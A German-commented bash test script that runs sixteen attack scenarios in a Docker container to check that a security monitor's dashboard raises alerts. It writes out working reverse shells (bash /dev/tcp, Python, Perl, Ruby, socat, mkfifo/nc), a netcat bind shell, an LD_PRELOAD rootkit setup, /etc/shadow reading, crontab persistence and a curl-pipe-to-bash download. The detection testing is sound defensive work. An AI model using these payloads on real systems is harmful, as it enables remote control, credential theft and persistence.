#!/bin/bash
# ============================================================
# ARTEX Monitor – Kompletter Szenario-Test
# Testet alle Shell-Typen, Rootkits, Korrelationen, Auto-Neutralize
# Usage: bash test_all_scenarios.sh [--clean]
# ============================================================
CONTAINER="artex-app"
DASH="http://127.0.0.1:9999"
PASS=0; FAIL=0

ok()   { echo "  ✅ $1"; PASS=$((PASS+1)); }
fail() { echo "  ❌ $1"; FAIL=$((FAIL+1)); }
hdr()  { echo; echo "══════════════════════════════════════"; echo "  $1"; echo "══════════════════════════════════════"; }

check_alert() {
  # Prüft ob ein Alert-Muster in den letzten Events erscheint
  local pattern="$1"
  local desc="$2"
  local wait="${3:-3}"
  sleep "$wait"
  if curl -sf "$DASH/api/log" 2>/dev/null | tail -100 | grep -qi "$pattern"; then
    ok "$desc"
  else
    fail "$desc (Pattern '$pattern' nicht gefunden)"
  fi
}

cleanup_rootkit() {
  docker exec "$CONTAINER" sh -c 'echo "" > /etc/ld.so.preload 2>/dev/null; rm -f /tmp/*.so /dev/shm/*.so 2>/dev/null' 2>/dev/null
}

if [ "$1" = "--clean" ]; then
  echo "Cleanup..."
  cleanup_rootkit
  docker exec "$CONTAINER" pkill -f "nc.*-l" 2>/dev/null
  exit 0
fi

# Dashboard erreichbar?
if ! curl -sf "$DASH/" >/dev/null 2>&1; then
  echo "FEHLER: Dashboard nicht erreichbar unter $DASH"
  echo "Starte mit: bash start-dashboard.sh"
  exit 1
fi
echo "Dashboard erreichbar ✓"

# ── Szenario 1: Bash Reverse Shell ──────────────────────────────────────
hdr "1. Bash /dev/tcp Reverse Shell"
docker exec -d "$CONTAINER" bash -c 'bash -i >& /dev/tcp/172.18.0.1/9001 0>&1' 2>/dev/null
check_alert "REVERSE SHELL" "Bash /dev/tcp erkannt"

# ── Szenario 2: Python Reverse Shell ─────────────────────────────────────
hdr "2. Python Reverse Shell"
# Start a listener so the connection succeeds and the process stays alive long enough to be scanned
nc -lvnp 9002 >/dev/null 2>&1 &
NC2PID=$!
sleep 0.3
docker exec -d "$CONTAINER" python3 -c \
  "import socket,subprocess,os; s=socket.socket(); s.connect(('172.18.0.1',9002)); subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())" 2>/dev/null
check_alert "Python socket\|Python connect\|Python TCP" "Python Reverse Shell erkannt" 4
kill $NC2PID 2>/dev/null

# ── Szenario 3: Netcat Bind Shell ────────────────────────────────────────
hdr "3. NC Bind Shell"
docker exec -d "$CONTAINER" sh -c 'nc -lvnp 5555 -e /bin/bash' 2>/dev/null
sleep 2
if curl -sf "$DASH/api/sessions" 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -q '"remote"'; then
  ok "Session-Tracking aktiv"
else
  echo "  ⚠ Keine Session erfasst (evtl. kein Listener aktiv)"
fi
check_alert "BIND SHELL\|NEUER LISTENER" "Bind Shell erkannt"

# ── Szenario 4: Socat Reverse Shell ──────────────────────────────────────
hdr "4. Socat Reverse Shell"
if docker exec "$CONTAINER" which socat >/dev/null 2>&1; then
  docker exec -d "$CONTAINER" socat TCP:172.18.0.1:9003 EXEC:'/bin/bash -i',pty,stderr 2>/dev/null
  check_alert "socat" "Socat Reverse Shell erkannt"
else
  echo "  ⚠ socat nicht im Container – übersprungen"
fi

# ── Szenario 5: Ruby Reverse Shell ────────────────────────────────────────
hdr "5. Ruby Reverse Shell"
if docker exec "$CONTAINER" which ruby >/dev/null 2>&1; then
  docker exec -d "$CONTAINER" ruby -rsocket -e \
    's=TCPSocket.new("172.18.0.1",9004);[1,2,3].each{|fd| IO.new(fd,fd==0?"r":"w").reopen(s)};system "/bin/bash -i"' 2>/dev/null
  check_alert "Ruby" "Ruby Reverse Shell erkannt"
else
  echo "  ⚠ ruby nicht im Container – übersprungen"
fi

# ── Szenario 6: Perl Reverse Shell ────────────────────────────────────────
hdr "6. Perl Reverse Shell"
if docker exec "$CONTAINER" which perl >/dev/null 2>&1; then
  nc -lvnp 9005 >/dev/null 2>&1 &
  NC5PID=$!
  sleep 0.3
  docker exec -d "$CONTAINER" perl -e \
    'use Socket;$i="172.18.0.1";$p=9005;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i")' 2>/dev/null
  check_alert "Perl" "Perl Reverse Shell erkannt" 4
  kill $NC5PID 2>/dev/null
else
  echo "  ⚠ perl nicht im Container – übersprungen"
fi

# ── Szenario 7: Rootkit – LD_PRELOAD via /etc/ld.so.preload ───────────────
hdr "7. Rootkit – LD_PRELOAD"
# Simuliertes .so erstellen
docker exec "$CONTAINER" sh -c 'echo "void _init(){}" > /tmp/evil.c && gcc -shared -o /tmp/.libevil.so /tmp/evil.c 2>/dev/null || echo "MZ" > /tmp/.libevil.so'
docker exec "$CONTAINER" sh -c 'echo "/tmp/.libevil.so" > /etc/ld.so.preload 2>/dev/null'
sleep 2
STATE=$(curl -sf "$DASH/api/rootkit_state" 2>/dev/null)
if echo "$STATE" | python3 -c "import sys,json; s=json.load(sys.stdin); exit(0 if s.get('active') else 1)" 2>/dev/null; then
  ok "Rootkit-State aktiv erkannt (/api/rootkit_state)"
else
  fail "Rootkit-State nicht erkannt"
fi
# Wait up to 20s for the monitor's periodic rootkit check (runs every ~15s)
check_alert "ld.so.preload\|ROOTKIT" "ld.so.preload Alert ausgelöst" 20

# ── Szenario 8: Rootkit – .so in /dev/shm ────────────────────────────────
hdr "8. Rootkit – .so in /dev/shm"
docker exec "$CONTAINER" sh -c 'echo "MZ" > /dev/shm/backdoor.so'
# Wait for next periodic rootkit check cycle
check_alert "ROOTKIT.*shm\|Lib/Modul.*shm\|Lib.Modul.*shm" "Rootkit .so in /dev/shm erkannt" 20

# ── Szenario 9: Anti-Monitor ─────────────────────────────────────────────
hdr "9. Anti-Monitor Detection"
# Run the pkill in a loop with brief sleep to maximize scan window
docker exec -d "$CONTAINER" sh -c 'for i in 1 2 3; do sleep 0.5; pkill -0 -f artex-monitor.py 2>/dev/null && pkill -f artex-monitor.py 2>/dev/null; sleep 1; done' 2>/dev/null
check_alert "ANTI-MONITOR" "Anti-Monitor erkannt" 8

# ── Szenario 10: Container Escape Versuch ────────────────────────────────
hdr "10. Container Escape Simulation"
# nsenter as actual command invocation (detached, so it stays in /proc long enough to be scanned)
docker exec -d "$CONTAINER" sh -c 'sleep 1 && nsenter --no-fork --help 2>/dev/null; true' 2>/dev/null
check_alert "CONTAINER ESCAPE\|nsenter" "Container Escape erkannt" 5

# ── Szenario 11: Exfiltration ─────────────────────────────────────────────
hdr "11. Exfiltration Simulation"
docker exec "$CONTAINER" sh -c 'cat /etc/shadow 2>/dev/null | head -1; true' 2>/dev/null
check_alert "shadow\|EXFIL" "Shadow-Lesen erkannt"

# ── Szenario 12: Persistence ──────────────────────────────────────────────
hdr "12. Persistence"
docker exec "$CONTAINER" sh -c 'echo "* * * * * /tmp/rev.sh" | crontab -' 2>/dev/null
check_alert "crontab\|PERSISTENCE" "Crontab-Modifikation erkannt"

# ── Szenario 13: Curl|Bash RCE ───────────────────────────────────────────
hdr "13. Curl | Bash RCE"
# curl --max-time 5 keeps the curl process alive for up to 5s → easily caught by scanner
docker exec -d "$CONTAINER" sh -c 'curl --max-time 5 -sf http://1.2.3.4/shell.sh | bash' 2>/dev/null
check_alert "curl.*bash\|RCE" "Curl|Bash erkannt" 5

# ── Szenario 14: mkfifo Reverse Shell ─────────────────────────────────────
hdr "14. mkfifo Reverse Shell"
docker exec "$CONTAINER" sh -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 172.18.0.1 9006 >/tmp/f &' 2>/dev/null
check_alert "mkfifo\|REVERSE SHELL" "mkfifo Shell erkannt"

# ── Szenario 15: Autokill Test ────────────────────────────────────────────
hdr "15. Autokill API"
# Toggle an
R=$(curl -sf -X POST "$DASH/api/autokill" -H 'Content-Type:application/json' -d '{"enabled":true}')
if echo "$R" | python3 -c "import sys,json; s=json.load(sys.stdin); exit(0 if s.get('enabled') else 1)" 2>/dev/null; then
  ok "Autokill aktivierbar"
else
  fail "Autokill API Fehler: $R"
fi
# Toggle aus
curl -sf -X POST "$DASH/api/autokill" -H 'Content-Type:application/json' -d '{"enabled":false}' >/dev/null

# ── Szenario 16: Auto-Neutralize API ─────────────────────────────────────
hdr "16. Auto-Neutralize API"
R=$(curl -sf -X POST "$DASH/api/auto_neutralize" -H 'Content-Type:application/json' -d '{"enabled":true}')
if echo "$R" | python3 -c "import sys,json; s=json.load(sys.stdin); exit(0 if s.get('enabled') else 1)" 2>/dev/null; then
  ok "Auto-Neutralize aktivierbar"
else
  fail "Auto-Neutralize API Fehler: $R"
fi
# Mit aktiviertem Auto-Neutralize neuen Rootkit-Alert auslösen
docker exec "$CONTAINER" sh -c 'echo "/tmp/.libevil.so" > /etc/ld.so.preload 2>/dev/null'
sleep 3
STATE2=$(curl -sf "$DASH/api/rootkit_state" 2>/dev/null)
if echo "$STATE2" | python3 -c "import sys,json; s=json.load(sys.stdin); exit(0 if not s.get('active') else 1)" 2>/dev/null; then
  ok "Auto-Neutralize hat Rootkit entfernt"
else
  echo "  ⚠ Rootkit ggf. noch aktiv (60s Dedup-Timer)"
fi
curl -sf -X POST "$DASH/api/auto_neutralize" -H 'Content-Type:application/json' -d '{"enabled":false}' >/dev/null

# ── Cleanup ────────────────────────────────────────────────────────────────
hdr "Cleanup"
cleanup_rootkit
docker exec "$CONTAINER" pkill -f "nc.*-l" 2>/dev/null
docker exec "$CONTAINER" sh -c 'crontab -r 2>/dev/null; rm -f /tmp/f /tmp/evil.c /tmp/.libevil.so /dev/shm/backdoor.so' 2>/dev/null
ok "Container bereinigt"

# ── Ergebnis ───────────────────────────────────────────────────────────────
echo
echo "══════════════════════════════════════"
echo "  ERGEBNIS: $PASS bestanden, $FAIL fehlgeschlagen"
echo "══════════════════════════════════════"
[ $FAIL -eq 0 ] && echo "  ✅ Alle Tests bestanden!" || echo "  ⚠ $FAIL Test(s) fehlgeschlagen"
